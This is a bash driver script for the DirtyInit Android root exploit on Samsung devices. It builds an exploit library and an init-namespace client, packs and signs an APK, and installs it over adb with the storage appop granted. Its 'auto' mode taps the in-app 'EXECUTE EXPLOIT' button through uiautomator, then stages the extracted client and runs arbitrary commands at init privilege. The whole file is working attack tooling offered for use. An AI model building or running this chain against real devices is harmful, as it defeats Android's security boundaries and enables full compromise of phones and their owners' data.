#!/bin/bash
# dirtyinit_drive.sh - operator-side driver for the DirtyInit Android root chain.
#
# DirtyInit (https://github.com/combeng6th/DirtyInit) escalates a stock user
# app to the init namespace (u:r:init:s0) on Samsung devices. Upstream ships
# an app and two native sources but no build system, and the README leaves
# the device choreography to the operator. This driver closes that gap:
#
#   build    cross-compile the init-namespace client + libdfi_exploit.so and
#            pack the APK with the NDK and the Android SDK build-tools
#   install  adb install the APK and grant the storage appop
#   launch   start the exploit activity
#   auto     launch, tap EXECUTE EXPLOIT and EXTRACT CLI via uiautomator
#   extract  pull the client from /sdcard
#   stage    push the client to an exec-capable device path
#   run      execute a command in the init namespace
#   status   report the whole pipeline state
#
# Usage:
#   dirtyinit_drive.sh [--serial <adb-serial>] <action> [args]
#
# Actions:
#   doctor              toolchain and device report
#   build               cross-compile the client and pack the APK
#   install             adb install the APK and grant the storage appop
#   launch              start the exploit activity
#   auto                launch, tap EXECUTE EXPLOIT and EXTRACT CLI
#   extract             pull the client from /sdcard
#   stage               push the client to an exec-capable device path
#   run <cmd> [args]    run a command in the init namespace
#   logs                dump the app logcat buffer
#   status              report the whole pipeline state
#
# Global flags (before the action):
#   --serial <serial>       ADB serial of the target device
#   --device-path <path>    device path of the staged client
#
# Environment:
#   ANDROID_SERIAL          ADB serial of the target device (default: the only device)
#   DIRTYINIT_SRC           DirtyInit checkout (default: external/.exploit/dirtyinit)
#   DIRTYINIT_OUT           artefact directory (default: sessions/dirtyinit)
#   DIRTYINIT_DEVICE_PATH   device path of the staged client (default: /data/local/tmp/dirtyinit)
#   ANDROID_SDK_ROOT        Android SDK (default: $ANDROID_HOME)
#   ANDROID_NDK_HOME        Android NDK (default: $ANDROID_NDK_ROOT)

set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
SRC="${DIRTYINIT_SRC:-$ROOT/external/.exploit/dirtyinit}"
OUT="${DIRTYINIT_OUT:-$ROOT/sessions/dirtyinit}"
DEVICE_PATH="${DIRTYINIT_DEVICE_PATH:-/data/local/tmp/dirtyinit}"
SERIAL="${ANDROID_SERIAL:-}"
APP_ID="com.dirty.init"
ACTIVITY_CLASS="com.dirty.init.DirtyInitActivity"
MIN_API="${DIRTYINIT_API:-28}"
TARGET_API="${DIRTYINIT_TARGET_API:-34}"
ABI="arm64-v8a"
CLIENT_ASSET="dirtyinit"
APK_NAME="dirtyinit.apk"
KEYSTORE_NAME="debug.keystore"
KEYSTORE_PASS="android"
TAP_SETTLE_SECONDS="${DIRTYINIT_TAP_SETTLE:-3}"
EXPLOIT_SETTLE_SECONDS="${DIRTYINIT_EXPLOIT_WAIT:-10}"

log() { printf '%s\n' "$*"; }
warn() { printf '[!] %s\n' "$*" >&2; }
die() { warn "$*"; exit 1; }

payload_value() {
    local key="$1" value
    [[ -f "$ROOT/payload.json" ]] || return 0
    value="$(python3 - "$ROOT/payload.json" "$key" <<'PY' 2>/dev/null
import json
import sys

try:
    with open(sys.argv[1], encoding="utf-8") as handle:
        document = json.load(handle)
except Exception:
    sys.exit(0)
value = document.get(sys.argv[2], "")
if isinstance(value, str):
    sys.stdout.write(value.replace("\n", " "))
PY
)"
    printf '%s' "$value"
}

parse_flags() {
    while [[ ${#ARGS[@]} -gt 0 ]]; do
        case "${ARGS[0]}" in
            --serial)
                SERIAL="${ARGS[1]:-}"
                ARGS=("${ARGS[@]:2}")
                ;;
            --serial=*)
                SERIAL="${ARGS[0]#*=}"
                ARGS=("${ARGS[@]:1}")
                ;;
            --device-path)
                DEVICE_PATH="${ARGS[1]:-}"
                ARGS=("${ARGS[@]:2}")
                ;;
            --device-path=*)
                DEVICE_PATH="${ARGS[0]#*=}"
                ARGS=("${ARGS[@]:1}")
                ;;
            -*)
                warn "unknown flag: ${ARGS[0]}"
                ARGS=("${ARGS[@]:1}")
                ;;
            *)
                break
                ;;
        esac
    done
}

ARGS=("$@")
parse_flags

ADB=(adb)
if [[ -z "$SERIAL" ]]; then
    SERIAL="$(payload_value android_serial)"
fi
if [[ -n "$SERIAL" ]]; then
    ADB+=(-s "$SERIAL")
fi

require_adb() {
    command -v adb >/dev/null 2>&1 || die "adb not found - install Android platform-tools"
}

require_device() {
    require_adb
    local state
    state="$("${ADB[@]}" get-state 2>/dev/null || true)"
    [[ "$state" == "device" ]] || die "no ADB device ready (state=${state:-none}) - enable USB debugging and authorise this host"
}

find_sdk() {
    local candidate
    for candidate in "${ANDROID_SDK_ROOT:-}" "${ANDROID_HOME:-}" "$HOME/Android/Sdk" "$HOME/Library/Android/sdk"; do
        if [[ -n "$candidate" && -d "$candidate" ]]; then
            printf '%s' "$candidate"
            return 0
        fi
    done
    return 1
}

find_ndk() {
    local candidate sdk
    for candidate in "${ANDROID_NDK_HOME:-}" "${ANDROID_NDK_ROOT:-}"; do
        if [[ -n "$candidate" && -d "$candidate" ]]; then
            printf '%s' "$candidate"
            return 0
        fi
    done
    sdk="$(find_sdk)" || return 1
    candidate="$(find "$sdk/ndk" -maxdepth 1 -mindepth 1 -type d 2>/dev/null | sort -V | tail -n 1)"
    [[ -n "$candidate" ]] || return 1
    printf '%s' "$candidate"
}

find_build_tools() {
    local sdk="$1" candidate
    candidate="$(find "$sdk/build-tools" -maxdepth 1 -mindepth 1 -type d 2>/dev/null | sort -V | tail -n 1)"
    [[ -n "$candidate" ]] || return 1
    printf '%s' "$candidate"
}

find_android_jar() {
    local sdk="$1" candidate
    candidate="$sdk/platforms/android-$TARGET_API/android.jar"
    if [[ -f "$candidate" ]]; then
        printf '%s' "$candidate"
        return 0
    fi
    candidate="$(find "$sdk/platforms" -maxdepth 2 -name android.jar 2>/dev/null | sort -V | tail -n 1)"
    [[ -n "$candidate" ]] || return 1
    printf '%s' "$candidate"
}

find_ndk_clang() {
    local ndk="$1" host candidate tag="aarch64-linux-android$MIN_API"
    for host in linux-x86_64 linux-aarch64 darwin-x86_64 darwin-arm64; do
        candidate="$ndk/toolchains/llvm/prebuilt/$host/bin/$tag-clang"
        if [[ -x "$candidate" ]]; then
            printf '%s' "$candidate"
            return 0
        fi
    done
    if command -v "$tag-clang" >/dev/null 2>&1; then
        command -v "$tag-clang"
        return 0
    fi
    return 1
}

find_java_tool() {
    local tool="$1" candidate
    candidate="$(command -v "$tool" 2>/dev/null || true)"
    if [[ -z "$candidate" && -n "${JAVA_HOME:-}" && -x "$JAVA_HOME/bin/$tool" ]]; then
        candidate="$JAVA_HOME/bin/$tool"
    fi
    [[ -n "$candidate" ]] || return 1
    printf '%s' "$candidate"
}

pack_apk() {
    local work="$1"
    APK_IN="$work/apk/unsigned.apk" \
    APK_OUT="$work/apk/packed.apk" \
    DEX_FILE="$work/dex/classes.dex" \
    ASSETS_DIR="$work/assets" \
    LIB_SO="$work/libdfi_exploit.so" \
    python3 - <<'PY'
import os
import zipfile

apk_in = os.environ["APK_IN"]
apk_out = os.environ["APK_OUT"]
dex_file = os.environ["DEX_FILE"]
assets_dir = os.environ["ASSETS_DIR"]
lib_so = os.environ["LIB_SO"]

with zipfile.ZipFile(apk_in, "r") as src:
    entries = [(item.filename, src.read(item.filename), item.compress_type) for item in src.infolist()]

with zipfile.ZipFile(apk_out, "w", zipfile.ZIP_DEFLATED) as dst:
    for name, data, compress in entries:
        info = zipfile.ZipInfo(name)
        info.compress_type = compress
        info.external_attr = 0o100644 << 16
        dst.writestr(info, data)

    def add(arcname, path, mode=0o100644):
        info = zipfile.ZipInfo(arcname)
        info.compress_type = zipfile.ZIP_DEFLATED
        info.external_attr = mode << 16
        with open(path, "rb") as handle:
            dst.writestr(info, handle.read())

    add("classes.dex", dex_file)
    add("lib/" + os.environ.get("ABI", "arm64-v8a") + "/libdfi_exploit.so", lib_so, 0o100755)
    for root, _dirs, files in os.walk(assets_dir):
        for name in files:
            full = os.path.join(root, name)
            rel = os.path.relpath(full, assets_dir).replace(os.sep, "/")
            add("assets/" + rel, full)
PY
}

compile_activity() {
    local javac="$1" android_jar="$2" work="$3" source
    source="$SRC/app/src/main/java/com/dirty/init/DirtyInitActivity.java"
    "$javac" --release 8 -nowarn -classpath "$android_jar" -d "$work/classes" "$source" 2>"$work/javac.log" && return 0
    warn "javac --release 8 failed, retrying with -source/-target 8"
    "$javac" -source 8 -target 8 -nowarn -classpath "$android_jar" -d "$work/classes" "$source" 2>>"$work/javac.log" && return 0
    warn "javac -source 8 failed, retrying with --release 11"
    "$javac" --release 11 -nowarn -classpath "$android_jar" -d "$work/classes" "$source" 2>>"$work/javac.log"
}

do_build() {
    local sdk ndk clang build_tools android_jar javac keytool work

    [[ -d "$SRC/native" ]] || die "DirtyInit sources not found at $SRC - run the addon once so the repo is cloned"
    sdk="$(find_sdk)" || die "Android SDK not found - set ANDROID_SDK_ROOT"
    ndk="$(find_ndk)" || die "Android NDK not found - set ANDROID_NDK_HOME"
    clang="$(find_ndk_clang "$ndk")" || die "NDK clang for aarch64-linux-android$MIN_API not found under $ndk"
    build_tools="$(find_build_tools "$sdk")" || die "Android build-tools not found under $sdk/build-tools"
    android_jar="$(find_android_jar "$sdk")" || die "android.jar for API $TARGET_API not found under $sdk/platforms"
    javac="$(find_java_tool javac)" || die "javac not found - install a JDK 17+ and set JAVA_HOME"
    keytool="$(find_java_tool keytool)" || die "keytool not found - install a JDK 17+ and set JAVA_HOME"

    work="$OUT/build"
    mkdir -p "$work/classes" "$work/dex" "$work/apk" "$work/assets" "$OUT"

    log "[*] Cross-compiling $CLIENT_ASSET client (static, aarch64)..."
    "$clang" -static -O2 -fPIE -o "$work/$CLIENT_ASSET" "$SRC/native/dirtyinit.c" || die "client build failed"

    log "[*] Cross-compiling libdfi_exploit.so..."
    "$clang" -shared -fPIC -O2 -o "$work/libdfi_exploit.so" "$SRC/native/dfi_exploit.c" -llog || die "exploit library build failed"

    log "[*] Staging app assets..."
    cp -f "$SRC/app/src/main/assets/payload_500.bin" "$work/assets/payload_500.bin" 2>/dev/null || warn "payload_500.bin missing from the checkout"
    cp -f "$SRC/app/src/main/assets/payload_576.bin" "$work/assets/payload_576.bin" 2>/dev/null || warn "payload_576.bin missing from the checkout"
    cp -f "$work/$CLIENT_ASSET" "$work/assets/$CLIENT_ASSET"
    [[ -f "$SRC/app/src/main/assets/overlay_scratch.img" ]] && cp -f "$SRC/app/src/main/assets/overlay_scratch.img" "$work/assets/overlay_scratch.img" || true

    log "[*] Compiling the exploit activity..."
    if ! compile_activity "$javac" "$android_jar" "$work"; then
        die "javac failed - see $work/javac.log"
    fi

    log "[*] Dexing..."
    "$build_tools/d8" --min-api "$MIN_API" --lib "$android_jar" --output "$work/dex" \
        $(find "$work/classes" -name '*.class') || die "d8 failed"

    log "[*] Linking resources..."
    "$build_tools/aapt2" link -o "$work/apk/unsigned.apk" \
        --manifest "$SRC/app/src/main/AndroidManifest.xml" \
        -I "$android_jar" \
        --min-sdk-version "$MIN_API" \
        --target-sdk-version "$TARGET_API" \
        --version-code 100 --version-name 1.00 || die "aapt2 link failed"

    log "[*] Packing the APK..."
    ABI="$ABI" pack_apk "$work" || die "APK packing failed"

    if [[ ! -f "$work/$KEYSTORE_NAME" ]]; then
        log "[*] Generating a debug keystore..."
        "$keytool" -genkeypair -keystore "$work/$KEYSTORE_NAME" -storepass "$KEYSTORE_PASS" \
            -keypass "$KEYSTORE_PASS" -alias androiddebugkey -keyalg RSA -keysize 2048 \
            -validity 10000 -dname "CN=Android Debug,O=Android,C=US" >/dev/null 2>&1 \
            || die "keytool failed to create $KEYSTORE_NAME"
    fi

    "$build_tools/zipalign" -f -p 4 "$work/apk/packed.apk" "$work/apk/aligned.apk" || die "zipalign failed"
    "$build_tools/apksigner" sign --ks "$work/$KEYSTORE_NAME" --ks-pass "pass:$KEYSTORE_PASS" \
        --key-pass "pass:$KEYSTORE_PASS" --out "$OUT/$APK_NAME" "$work/apk/aligned.apk" || die "apksigner failed"

    log "[*] APK ready: $OUT/$APK_NAME"
    log "[*] Client ready: $work/$CLIENT_ASSET"
    log "[*] Next: dirtyinit install"
}

do_install() {
    local apk="$OUT/$APK_NAME"
    require_device
    [[ -f "$apk" ]] || die "APK not found at $apk - run 'dirtyinit build' first"
    log "[*] Installing $apk..."
    "${ADB[@]}" install -r -g "$apk" || die "adb install failed"
    "${ADB[@]}" shell appops set "$APP_ID" MANAGE_EXTERNAL_STORAGE allow >/dev/null 2>&1 \
        || warn "appop grant failed - grant All Files Access by hand in the app"
    log "[*] Installed. Next: dirtyinit auto"
}

do_launch() {
    require_device
    "${ADB[@]}" shell input keyevent KEYCODE_WAKEUP >/dev/null 2>&1 || true
    "${ADB[@]}" shell wm dismiss-keyguard >/dev/null 2>&1 || true
    "${ADB[@]}" shell am start -n "$APP_ID/$ACTIVITY_CLASS" || die "am start failed"
    sleep "$TAP_SETTLE_SECONDS"
}

tap_button() {
    local needle="$1" dump coords
    "${ADB[@]}" shell uiautomator dump /sdcard/window_dump.xml >/dev/null 2>&1 || true
    dump="$("${ADB[@]}" shell cat /sdcard/window_dump.xml 2>/dev/null | tr -d '\r')"
    [[ -n "$dump" ]] || { warn "UI dump failed - is the app in the foreground?"; return 1; }
    coords="$(printf '%s' "$dump" | BUTTON_NEEDLE="$needle" python3 -c '
import os
import re
import sys
import xml.etree.ElementTree as ET

needle = os.environ.get("BUTTON_NEEDLE", "").lower()
try:
    root = ET.fromstring(sys.stdin.read())
except ET.ParseError:
    sys.exit(2)

for node in root.iter("node"):
    haystack = " ".join(
        filter(None, [node.get("text", ""), node.get("content-desc", "")])
    ).lower()
    if needle and needle in haystack:
        match = re.search(r"\[(\d+),(\d+)\]\[(\d+),(\d+)\]", node.get("bounds", ""))
        if match:
            left, top, right, bottom = (int(value) for value in match.groups())
            print((left + right) // 2, (top + bottom) // 2)
            sys.exit(0)
sys.exit(1)
')" || { warn "button '$needle' not found in the UI dump"; return 1; }
    log "[*] Tapping '$needle' at $coords"
    "${ADB[@]}" shell input tap $coords
    return 0
}

do_auto() {
    require_device
    do_launch
    tap_button "EXECUTE EXPLOIT" || die "cannot find the EXECUTE EXPLOIT button"
    log "[*] Exploit running, waiting ${EXPLOIT_SETTLE_SECONDS}s..."
    sleep "$EXPLOIT_SETTLE_SECONDS"
    tap_button "EXTRACT CLI" || die "cannot find the EXTRACT CLI button"
    sleep "$TAP_SETTLE_SECONDS"
    do_extract
}

do_extract() {
    require_device
    mkdir -p "$OUT"
    log "[*] Pulling the client from /sdcard..."
    "${ADB[@]}" pull /sdcard/"$CLIENT_ASSET" "$OUT/$CLIENT_ASSET" || die "pull failed - tap EXTRACT CLI in the app first"
    chmod +x "$OUT/$CLIENT_ASSET" 2>/dev/null || true
    log "[*] Client saved at $OUT/$CLIENT_ASSET. Next: dirtyinit stage"
}

do_stage() {
    require_device
    [[ -f "$OUT/$CLIENT_ASSET" ]] || die "client missing at $OUT/$CLIENT_ASSET - run 'dirtyinit extract' first"
    log "[*] Pushing the client to $DEVICE_PATH..."
    "${ADB[@]}" push "$OUT/$CLIENT_ASSET" "$DEVICE_PATH" || die "adb push failed"
    "${ADB[@]}" shell chmod 755 "$DEVICE_PATH" || die "chmod failed"
    "${ADB[@]}" shell ls -l "$DEVICE_PATH"
    log "[*] Staged. Next: dirtyinit run ls -la /system/bin"
}

do_run() {
    require_device
    [[ $# -ge 1 ]] || die "usage: $(basename "$0") run <command> [args...]"
    "${ADB[@]}" shell "$DEVICE_PATH" "$@"
}

do_logs() {
    require_device
    "${ADB[@]}" logcat -d -s DIRTY_INIT DirtyInitFS | tail -n 80
}

do_status() {
    local sdk ndk state installed
    log "DirtyInit status"
    log "  repo root     : $ROOT"
    log "  source        : $SRC$([[ -d "$SRC/native" ]] && echo ' (present)' || echo ' (missing)')"
    log "  artefacts     : $OUT"
    log "  device path   : $DEVICE_PATH"
    log "  adb serial    : ${SERIAL:-<default device>}"

    if ! command -v adb >/dev/null 2>&1; then
        log "  adb device    : adb not installed"
    else
        state="$("${ADB[@]}" get-state 2>/dev/null || true)"
        if [[ "$state" == "device" ]]; then
            log "  adb device    : ready"
            log "  model         : $("${ADB[@]}" shell getprop ro.product.model 2>/dev/null | tr -d '\r')"
            log "  android       : $("${ADB[@]}" shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')"
            installed="$("${ADB[@]}" shell pm list packages "$APP_ID" 2>/dev/null | tr -d '\r')"
            if [[ -n "$installed" ]]; then
                log "  app installed : yes"
            else
                log "  app installed : no"
            fi
        else
            log "  adb device    : ${state:-none}"
        fi
    fi

    if [[ -f "$OUT/$APK_NAME" ]]; then
        log "  apk           : $OUT/$APK_NAME"
    else
        log "  apk           : not built"
    fi
    if [[ -f "$OUT/$CLIENT_ASSET" ]]; then
        log "  client        : $OUT/$CLIENT_ASSET"
    else
        log "  client        : not extracted"
    fi

    sdk="$(find_sdk || true)"
    ndk="$(find_ndk || true)"
    log "  android sdk   : ${sdk:-not found}"
    log "  android ndk   : ${ndk:-not found}"
}

do_doctor() {
    local missing=0 sdk ndk clang build_tools android_jar
    log "DirtyInit toolchain doctor"
    if command -v adb >/dev/null 2>&1; then
        log "  adb           : $(command -v adb)"
    else
        warn "  adb           : missing - install Android platform-tools"
        missing=1
    fi
    if command -v javac >/dev/null 2>&1 || [[ -n "${JAVA_HOME:-}" ]]; then
        log "  jdk           : $(find_java_tool javac || echo "$JAVA_HOME")"
    else
        warn "  jdk           : missing - install JDK 17+ and export JAVA_HOME"
        missing=1
    fi
    sdk="$(find_sdk || true)"
    if [[ -n "$sdk" ]]; then
        log "  android sdk   : $sdk"
    else
        warn "  android sdk   : missing - export ANDROID_SDK_ROOT"
        missing=1
    fi
    ndk="$(find_ndk || true)"
    if [[ -n "$ndk" ]]; then
        log "  android ndk   : $ndk"
        clang="$(find_ndk_clang "$ndk" || true)"
        if [[ -n "$clang" ]]; then
            log "  ndk clang     : $clang"
        else
            warn "  ndk clang     : missing for aarch64-linux-android$MIN_API"
            missing=1
        fi
    else
        warn "  android ndk   : missing - export ANDROID_NDK_HOME"
        missing=1
    fi
    if [[ -n "$sdk" ]]; then
        build_tools="$(find_build_tools "$sdk" || true)"
        android_jar="$(find_android_jar "$sdk" || true)"
        log "  build-tools   : ${build_tools:-missing}"
        log "  android.jar   : ${android_jar:-missing}"
        [[ -n "$build_tools" && -n "$android_jar" ]] || missing=1
    fi
    if [[ -d "$SRC/native" ]]; then
        log "  dirtyinit src : $SRC"
    else
        warn "  dirtyinit src : missing at $SRC - run the addon once to clone it"
        missing=1
    fi
    if [[ "$missing" -eq 0 ]]; then
        log "  verdict       : ready"
        return 0
    fi
    log "  verdict       : missing prerequisites (see above)"
    return 1
}

do_help() {
    awk 'NR == 1 { next } /^#/ { sub(/^# ?/, ""); print; next } { exit }' "${BASH_SOURCE[0]}"
}

main() {
    local action
    parse_flags
    action="${ARGS[0]:-status}"
    if [[ ${#ARGS[@]} -gt 0 ]]; then
        ARGS=("${ARGS[@]:1}")
    fi
    if [[ "$action" != "run" ]]; then
        parse_flags
    fi
    local -a rest=(${ARGS[@]+"${ARGS[@]}"})
    case "$action" in
        doctor) do_doctor ;;
        build) do_build ;;
        install) do_install ;;
        launch) do_launch ;;
        auto) do_auto ;;
        extract) do_extract ;;
        stage) do_stage ;;
        push) do_stage ;;
        run) do_run ${rest[@]+"${rest[@]}"} ;;
        logs) do_logs ;;
        status) do_status ;;
        help|-h|--help) do_help ;;
        *)
            warn "unknown action: $action"
            do_help
            return 2
            ;;
    esac
}

main "$@"
